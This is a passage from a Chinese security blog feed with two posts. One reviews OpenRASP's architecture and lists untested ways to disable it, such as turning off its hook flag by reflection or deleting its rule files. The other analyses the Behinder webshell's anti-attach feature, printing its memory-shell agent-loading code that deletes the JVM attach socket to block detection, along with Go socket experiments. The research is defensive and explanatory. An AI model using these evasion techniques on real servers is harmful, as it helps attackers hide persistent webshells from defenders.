class="line">MongoConnectionChecker#check</span><br><span class="line">SqlConnectionChecker#check</span><br><span class="line">...            </span><br></pre></td></tr></table></figure><p><img src="/images/pasted-149.png" alt="upload successful"></p><p>Cheker类型可以大致分为3类</p><ol><li>js插件检测，如SQL、命令执行、XXE、SSRF之类</li><li>java本地检查，目前仅2个</li><li>安全基线检测，主要是类似配置检查，如弱口令之类</li></ol><h3 id="v8"><a href="#v8" class="headerlink" title="v8"></a>v8</h3><p>以上的Checker中，以V8AttackChecker最重要。至于为何要用JS检测引擎作为核心，个人认为主要原因应该是支持跨语言、热部署。</p><h4 id="install-openrasp-v8-in-mac"><a href="#install-openrasp-v8-in-mac" class="headerlink" title="install openrasp-v8 in mac"></a>install openrasp-v8 in mac</h4><p>官网的<a href="https://rasp.baidu.com/doc/hacking/compile/java.html#java-v8">安装脚本</a>是linux的，这里给下max下需要变动的命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ../java/src/main/resources/natives/osx_64 &amp;&amp; cp java/libopenrasp_v8_java.dylib <span class="variable">$_</span></span><br></pre></td></tr></table></figure><h4 id="JS引擎"><a href="#JS引擎" class="headerlink" title="JS引擎"></a>JS引擎</h4><p>官方文档还是Rhino的流程(这里和v8大致是一样的，细节不同)<br><img src="/images/pasted-150.png" alt="upload successful"></p><p>主要有两部分</p><ol><li>openrasp-v8的js库</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">├── console.jsconsole.log实现</span><br><span class="line">├── flex.jstokenize库，有sql_tokenize&amp;cmd_tokenize</span><br><span class="line">└── rasp.jsRASP基础类</span><br></pre></td></tr></table></figure><p>这些库可以在js插件中进行调用</p><ol start="2"><li>js插件</li></ol><p>检测逻辑都是在js插件内实现，初始化流程如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EngineBoot#start</span><br><span class="line">com.baidu.openrasp.plugin.js.JS#Initialize</span><br><span class="line">V8#Initialize</span><br><span class="line">com.baidu.openrasp.plugin.js.JS#UpdatePlugin</span><br><span class="line">V8#CreateSnapshot</span><br><span class="line">V8#ExecuteScript</span><br><span class="line">com.baidu.openrasp.plugin.js.JS#InitFileWatcher</span><br></pre></td></tr></table></figure><p>其中V8.CreateSnapshot/ExecuteScript都是在openrasp-v8 jni内实现的，未深入跟踪。</p><p>其中JS.UpdatePlugin默认会加载plugins下面的js。还有InitFileWatcher实时监控js插件文件变动，这个师傅们有讲这里也不讲了。</p><h4 id="check"><a href="#check" class="headerlink" title="check"></a>check</h4><p>V8AttackChecker到v8的流程如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">V8AttackChecker#check</span><br><span class="line">JS#Check</span><br><span class="line">    V8#Check</span><br></pre></td></tr></table></figure><p>V8.Check也是jni实现，暂无力跟踪，猜测是会根据type，调用对应的js插件内的check函数，如type=ssrf，就会调用official/plugins.js内的plugin.check_ssrf。</p><h2 id="OpenRASP的绕过"><a href="#OpenRASP的绕过" class="headerlink" title="OpenRASP的绕过"></a>OpenRASP的绕过</h2><p>参考【1】中有提到HookHandler.enableHook这个属性，通过反射设置为false关闭Hook功能，达到OpenRASP的绕过。</p><p>从原理上大致脑爆下可能存在的攻击点，限于精力，未做验证。</p><ul><li>可以根据OpenRASP Hook&amp;Check逻辑上的一些控制变量，达到绕过效果，如上面的enableHook。</li><li>可以退出OpenRASP，如调用EngineBoot#release</li><li>可以搞瞎V8，如V8.stackGetter</li><li>可以删除js规则，如plugins/xxx.js</li><li>针对性绕过js插件检测逻辑</li></ul><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在阅读师傅们文章的基础上，记录了自己在纯静态读OpenRASP源码时感兴趣的一些知识点，大致对其架构原理有了一定的了解。</p><p>个人认为最主要的点还是在v8引擎以及插件的检测逻辑上，但是本篇重点没有在此，只是简要过了一遍整个架构及原理。后续如果有精力，可能会在此基础上再研究下绕过的知识。</p><p>参考【1】中提到openrasp类优先加载影响应用类的问题，印象中商业版好像是做了解决，找不到群聊记录了。</p><p>最后有趣的八卦下：openrasp一开始用的是v8+j2v8，0.20因为性能原因改成了Rhino，1.1又改回了v8+自研的openrasp-v8，感觉是一段精益求精的历史，很有意思。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://threedr3am.github.io/2019/12/31/OpenRASP%E6%A0%B8%E5%BF%83%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/">OpenRASP核心源码浅析</a></li><li>[2] <a href="https://www.cnblogs.com/tr1ple/p/12918942.html">Java openrasp学习记录-2</a></li><li>[3] <a href="https://www.cnblogs.com/tr1ple/p/12709504.html#DAFPQtWG">Java openrasp学习记录-1</a></li><li>[4] <a href="https://paper.seebug.org/513/">Java RASP浅析——以百度OpenRASP为例</a></li><li>[5] <a href="https://rasp.baidu.com/doc/hacking/architect/java.html">系统架构 - Java 版本</a></li><li>[6] <a href="https://rasp.baidu.com/doc/hacking/architect/hook.html">Hook 函数列表</a></li><li>[7] <a href="https://github.com/baidu/openrasp">GitHub OpenRASP</a></li><li>[8] <a href="https://github.com/baidu-security/openrasp-v8">GitHub OpenRASP-v8</a></li><li>[9] <a href="https://paper.seebug.org/1041/#53">浅谈 RASP</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;RASP（Runtime Application self-protection）技术自Gartner在2014年提出，已经有挺长一段时间了。大厂们现在基本也都有自研的RASP、IAST产品。在开源RASP中，应以OpenRASP起步最早，应用也最广。不过因为性能原因，在实际攻防中覆盖面还是有限。&lt;/p&gt;
&lt;p&gt;RASP算是Java安全绕不开的一个技术点，有兴趣对此学习研究一番。参考文章中threedr3am、tr1ple、c0d3p1ut0s几个师傅们对于OpenRASP的原理、技术点都有跟踪和解释，因此本文不再多做类似的阐释，主要针对自己的一些知识盲点、兴趣点，做做研究与笔记。&lt;/p&gt;
&lt;h2 id=&quot;OpenRASP的Hook&quot;&gt;&lt;a href=&quot;#OpenRASP的Hook&quot; class=&quot;headerlink&quot; title=&quot;OpenRASP的Hook&quot;&gt;&lt;/a&gt;OpenRASP的Hook&lt;/h2&gt;&lt;p&gt;关注两点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如何Hook的&lt;/li&gt;
&lt;li&gt;Hook了哪些类的哪些方法&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;如何Hook&quot;&gt;&lt;a href=&quot;#如何Hook&quot; class=&quot;headerlink&quot; title=&quot;如何Hook&quot;&gt;&lt;/a&gt;如何Hook&lt;/h3&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="OpenRASP" scheme="http://m0d9.me/tags/OpenRASP/"/>
    
    <category term="RASP" scheme="http://m0d9.me/tags/RASP/"/>
    
  </entry>
  
  <entry>
    <title>从冰蝎antiAgent看Java Attach机制</title>
    <link href="http://m0d9.me/2021/06/21/JVM-Attach/"/>
    <id>http://m0d9.me/2021/06/21/JVM-Attach/</id>
    <published>2021-06-21T09:24:00.000Z</published>
    <updated>2021-06-24T07:15:51.920Z</updated>
    
    <content type="html"><![CDATA[<p>webshell的隐藏与检出一直以来都是攻防的焦点，随着内存马的研究与工具的公开，内存shell已然成为了webshell主流。</p><p>引用【9】中关于攻击的思路</p><blockquote><ol><li>基于Servlet规范的利用，动态注册Servlet规范中的组件，包括Servlet，Filter，Listener，这部分的公开文章比较多，比如：基于tomcat的内存 Webshell 无文件攻击技术（<a href="https://xz.aliyun.com/t/7388%EF%BC%89%E3%80%82">https://xz.aliyun.com/t/7388）。</a></li><li>基于特定框架的利用，框架一般对于Servlet又进行了一层封装，动态注册框架的路由，文章：基于内存 Webshell 的无文件攻击技术研究（<a href="https://www.anquanke.com/post/id/198886%EF%BC%89">https://www.anquanke.com/post/id/198886）</a></li><li>基于javaagent修改Servlet处理流程中的字节码，工具：memShell（<a href="https://github.com/rebeyond/memShell%EF%BC%89">https://github.com/rebeyond/memShell）</a></li></ol></blockquote><p>引用【8】中关于检测的思路</p><blockquote><p>无论是以上哪种攻击方式，从防守方的角度来说，检测的方式都是通过java instrumentation机制，将检测jar包attach到tomcat jvm，检查加载到jvm中的类是否异常。整体检测思路为：</p><ol><li>获取tomcat jvm中所有加载的类</li><li>遍历每个类，判断是否为风险类。我们把可能被攻击方新增/修改内存中的类，标记为风险类（比如实现了filter/servlet的类）</li><li>遍历风险类，检查是否为webshell：</li><li>检查高风险类的class文件是否存在；</li><li>反编译风险类字节码，检查java文件中包含恶意代码</li></ol></blockquote><p>有攻有防，而防御又引发攻击的升级，冰蝎最新版已经加入了反VirtualMachine.Attach功能。</p><a id="more"></a><h2 id="冰蝎AntiAgent"><a href="#冰蝎AntiAgent" class="headerlink" title="冰蝎AntiAgent"></a>冰蝎AntiAgent</h2><h3 id="AntiAgent的实现"><a href="#AntiAgent的实现" class="headerlink" title="AntiAgent的实现"></a>AntiAgent的实现</h3><p>先看看冰蝎的实现，具体在MemShell.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doAgentShell</span><span class="params">(<span class="keyword">boolean</span> antiAgent)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      Class VirtualMachineCls = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">      Method attachMethod = VirtualMachineCls.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>, String.class);</span><br><span class="line">      Method loadAgentMethod = VirtualMachineCls.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>, String.class, String.class);</span><br><span class="line">      Object obj = attachMethod.invoke(VirtualMachineCls, getCurrentPID());</span><br><span class="line">      loadAgentMethod.invoke(obj, libPath, base64encode(path) + <span class="string">&quot;|&quot;</span> + base64encode(password));</span><br><span class="line">      String osInfo = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();</span><br><span class="line">      <span class="keyword">if</span> (osInfo.indexOf(<span class="string">&quot;windows&quot;</span>) &lt; <span class="number">0</span> &amp;&amp; osInfo.indexOf(<span class="string">&quot;winnt&quot;</span>) &lt; <span class="number">0</span> &amp;&amp; osInfo.indexOf(<span class="string">&quot;linux&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp; antiAgent) &#123;</span><br><span class="line">         String fileName = <span class="string">&quot;/tmp/.java_pid&quot;</span> + getCurrentPID();</span><br><span class="line">         (<span class="keyword">new</span> File(fileName)).delete();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">      var12.printStackTrace();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Error var13) &#123;</span><br><span class="line">      var13.printStackTrace();</span><br><span class="line">   &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      (<span class="keyword">new</span> File(libPath)).delete();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="测试AntiAgent"><a href="#测试AntiAgent" class="headerlink" title="测试AntiAgent"></a>测试AntiAgent</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testAttach</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String pid = <span class="string">&quot;2715&quot;</span>;</span><br><span class="line">            System.out.println(System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>));</span><br><span class="line">            String password = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">            String currentPath = <span class="string">&quot;/Users/mody/study/java/MemShell/memShell/target/&quot;</span>;</span><br><span class="line">            String agentFile = currentPath + <span class="string">&quot;agent.jar&quot;</span>;</span><br><span class="line">            agentFile = <span class="keyword">new</span> File(agentFile).getCanonicalPath();</span><br><span class="line">            String agentArgs = currentPath;</span><br><span class="line">            <span class="keyword">if</span> (!password.equals(<span class="string">&quot;&quot;</span>) || password != <span class="keyword">null</span>) &#123;</span><br><span class="line">                agentArgs = agentArgs + <span class="string">&quot;^&quot;</span> + password;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            VirtualMachine vm = VirtualMachine.attach(pid);</span><br><span class="line">            vm.loadAgent(agentFile, agentArgs);</span><br><span class="line">            String fileName = System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>)+<span class="string">&quot;.java_pid&quot;</span> + pid;</span><br><span class="line">            System.out.println(fileName);</span><br><span class="line">            Boolean e = (<span class="keyword">new</span> File(fileName)).exists();</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">            var12.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="comment">//            (new File(libPath)).delete();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol><li>找一个jvm进程，运行testAttach</li><li>删除对应.java_pidxx</li><li>再运行testAttach，会发现报错，socket连不上</li></ol><p>可以看出，冰蝎通过删除.java_pid，实现了无法VirtualMachine.attach。原理如何？检测是否有绕过空间？</p><h2 id="Java-Attach机制"><a href="#Java-Attach机制" class="headerlink" title="Java Attach机制"></a>Java Attach机制</h2><p>参考【1】中总结了Java 的3种动态Attach方法</p><ol><li>继承Tool/HotSpotAgent.attach（采用Serviceability Agent，简称SA）</li><li>VirtualMachine.attach（Attach到Attach Listener线程后执行有限命令）</li><li>Perf.getPerf().attach（通过PerfData文件获取信息）</li></ol><p><img src="/images/pasted-146.png" alt="upload successful"></p><p>其中1会暂停进程，不适用于内存马的检测，3只是关注进程状态信息，主要用于性能分析，关注的类不全，无法用于检测异常类。</p><h3 id="Java-Instrumentation-API"><a href="#Java-Instrumentation-API" class="headerlink" title="Java Instrumentation API"></a>Java Instrumentation API</h3><p>引用参考【10】，Java Instrumentation APi支持启动时/运行时Attach Agent</p><p>如果需要在目标JVM启动的同时加载Agent，需要在Agent中实现下面的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1] public static void premain(String agentArgs, Instrumentation inst);</span><br><span class="line">[2] public static void premain(String agentArgs);</span><br></pre></td></tr></table></figure><p>如果希望在目标JVM运行时加载Agent，则需要实现下面的方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1] public static void agentmain(String agentArgs, Instrumentation inst);</span><br><span class="line">[2] public static void agentmain(String agentArgs);</span><br></pre></td></tr></table></figure><p>本文只关注运行时加载Agent，也就是VirtualMachine.attach。</p><h3 id="VirtualMachine-attach"><a href="#VirtualMachine-attach" class="headerlink" title="VirtualMachine.attach"></a>VirtualMachine.attach</h3><p><img src="/images/pasted-145.png" alt="upload successful"><br>此流程图需要搭配参考【3】中的调试过程，分析得出</p><p>JVM 流程</p><ol><li>init, 等待SIGQUIT（也是SIGBREAK）</li><li>收到SINQUIT，attach_pid验证（这个不是很重要）</li><li>判断是否有对应java_pid socket文件，没有则创建</li><li>建立unix socket tcp server ,绑定java_pid socket通道</li><li>进入循环，响应attach client</li><li>新SIGQUIT，验证attach_pid(不重要), 进入5（重点，并不会重新建server）</li></ol><p>在步骤5完成之后，删除掉java_pid socket文件，会怎样？可恢复吗？</p><ol><li>即使删除socket通道，server不会失败重新尝试连接</li><li>即使新建相同name的unix socket通道，client也无法连接，所以不可恢复</li></ol><h3 id="UnixSocket"><a href="#UnixSocket" class="headerlink" title="UnixSocket"></a>UnixSocket</h3><p>以下通过实验验证以上的两点结论</p><p>server.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//接收内容并返回结果</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HandleServerContext</span><span class="params">(context <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">now := time.Now().String()</span><br><span class="line"><span class="keyword">return</span> now</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接收连接并处理</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HandleServerConn</span><span class="params">(c net.Conn)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> c.Close()</span><br><span class="line">bufsize := <span class="number">32</span></span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, bufsize)</span><br><span class="line">nr, err := c.Read(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Read: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 这里，你需要 parse buf 里的数据来决定返回什么给客户端</span></span><br><span class="line"><span class="comment">// 假设 respnoseData 是你想返回的文件内容</span></span><br><span class="line">fmt.Print(<span class="keyword">string</span>(buf[<span class="number">0</span>:nr]))</span><br><span class="line">result := HandleServerContext(<span class="keyword">string</span>(buf[<span class="number">0</span>:nr]))</span><br><span class="line">_, err = c.Write([]<span class="keyword">byte</span>(result))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Writes failed.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Print(result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s_filename := <span class="string">&quot;/var/folders/vw/5c9ynmt1277dbnmrxjq8hzn40000gq/T/.java_pid10021&quot;</span></span><br><span class="line">addr, err := net.ResolveUnixAddr(<span class="string">&quot;unix&quot;</span>, s_filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Cannot resolve unix addr: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line">listener, err := net.ListenUnix(<span class="string">&quot;unix&quot;</span>, addr)</span><br><span class="line"><span class="keyword">defer</span> listener.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Cannot listen to unix domain socket: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;Listening on&quot;</span>, listener.Addr())</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">c, err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Accept: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> HandleServerConn(c)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s_filename := <span class="string">&quot;/var/folders/vw/5c9ynmt1277dbnmrxjq8hzn40000gq/T/.java_pid10021&quot;</span></span><br><span class="line">addr, err := net.ResolveUnixAddr(<span class="string">&quot;unix&quot;</span>, s_filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Cannot resolve unix addr: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//拔号</span></span><br><span class="line">c, err := net.DialUnix(<span class="string">&quot;unix&quot;</span>, <span class="literal">nil</span>, addr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;DialUnix failed.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写出</span></span><br><span class="line">context := <span class="string">&quot;hello server&quot;</span></span><br><span class="line">_, err = c.Write([]<span class="keyword">byte</span>(context))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Writes failed.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//读结果</span></span><br><span class="line">bufsize := <span class="number">32</span></span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, bufsize)</span><br><span class="line">nr, err := c.Read(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Read: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="keyword">string</span>(buf[<span class="number">0</span>:nr]))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>运行server</li><li>运行client，tcp连接ok，数据传输ok</li><li>删除java_pid</li><li>运行client，tcp连接失败</li><li>nc -lkU java_pid，创建相同文件</li><li>运行client，仍然连接失败</li></ol><h3 id="JVM信号"><a href="#JVM信号" class="headerlink" title="JVM信号"></a>JVM信号</h3><p>如上，通过恢复java_pid重建连接的思路无法走通，那有其他的思路重新让jvm建立新的tcp server吗？</p><p>第一步时是通过SIGQUIT信号触发jvm init tcp server的，有没有其他信号可以重现呢？可惜通过参考【4】，并未发现有如此功能的信号。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文复现了冰蝎为防止常见内存马检测antiAgent的功能（不得不膜拜beyond大佬，对Java实在是熟悉），在此基础上分析其实现原理，得出无法绕过的悲情结论。</p><p>不过无法Attach本身就是一个强特征（虽然有些/tmp目录清理会导致误报），也使得antiAgent有利有弊，攻击者也需要斟酌而用。</p><p>水平有限，如有疏漏，恳请告知。</p><p>———–20210624补充————</p><p>参考【11】中带头大哥 补充了关于冰蝎3.0beta8版本windows的实现，AntiAttach原理是通过关闭sun.tools.attach.WindowsVirtualMachine pipe，带头大哥 通过分析WindowsVirtualMachine JNI的实现得出：</p><blockquote><p>WindowsVirtualMachine是通过向目标JVM注入shellcode来执行我们与目标JVM的通信指令。Pipe只是一种通信手段，关闭pipe并不能影响我们向目标JVM加载javaagent。</p></blockquote><p>大哥66的</p><p>在linux侧，转化为的问题是：UnixSocket文件删除之后如何恢复原有的server连接？本文只尝试了新建同名socket文件，或者还有其他方式？这块还是菜🐔，求知道的大佬们指点。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1]<a href="https://www.jianshu.com/p/542e50edc8e3">Java Attach机制</a></li><li>[2]<a href="https://www.jianshu.com/p/5e1d3dab8534">RASP研发踩坑之attach失败</a></li><li>[3]<a href="https://mp.weixin.qq.com/s?__biz=MzIzNjI1ODc2OA==&mid=2650886799&idx=1&sn=108c5fdfcd2695594d4f80ff02fc9a70&mpshare=1&scene=21&srcid=0114WsKpUmDXhRtqy8x7JX5w#wechat_redirect">JVM源码分析之Attach机制实现完全解读</a></li><li>[4]<a href="https://www.ibm.com/docs/zh/sdk-java-technology/7?topic=hjps-signals-used-by-jvm">JVM 所使用的信号</a></li><li>[5]<a href="https://stackoverflow.com/questions/5769877/attachnotsupportedexception-due-to-missing-java-pid-file-in-attach-api">AttachNotSupportedException due to missing java_pid file in Attach API</a></li><li>[6]<a href="https://club.perfma.com/article/1596501">使用Go语言实现Attach到目标JVM进程</a></li><li>[7]<a href="http://jrasp.com/boke/#java-attach-api-%E4%BB%8B%E7%BB%8D">Java Instrumentation原理</a></li><li>[8]<a href="https://paper.seebug.org/1381/">Tomcat 内存马检测</a></li><li>[9]<a href="https://cloud.tencent.com/developer/article/1768499">杂谈Java内存Webshell的攻与防</a></li><li>[10]<a href="https://cloud.tencent.com/developer/news/476186">Java动态调试技术原理及实践</a></li><li>[11]<a href="https://forum.butian.net/share/142">冰蝎beta8内存马防查杀破解</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;webshell的隐藏与检出一直以来都是攻防的焦点，随着内存马的研究与工具的公开，内存shell已然成为了webshell主流。&lt;/p&gt;
&lt;p&gt;引用【9】中关于攻击的思路&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;基于Servlet规范的利用，动态注册Servlet规范中的组件，包括Servlet，Filter，Listener，这部分的公开文章比较多，比如：基于tomcat的内存 Webshell 无文件攻击技术（&lt;a href=&quot;https://xz.aliyun.com/t/7388%EF%BC%89%E3%80%82&quot;&gt;https://xz.aliyun.com/t/7388）。&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;基于特定框架的利用，框架一般对于Servlet又进行了一层封装，动态注册框架的路由，文章：基于内存 Webshell 的无文件攻击技术研究（&lt;a href=&quot;https://www.anquanke.com/post/id/198886%EF%BC%89&quot;&gt;https://www.anquanke.com/post/id/198886）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;基于javaagent修改Servlet处理流程中的字节码，工具：memShell（&lt;a href=&quot;https://github.com/rebeyond/memShell%EF%BC%89&quot;&gt;https://github.com/rebeyond/memShell）&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;引用【8】中关于检测的思路&lt;/p&gt;
&lt;blockquote&gt;
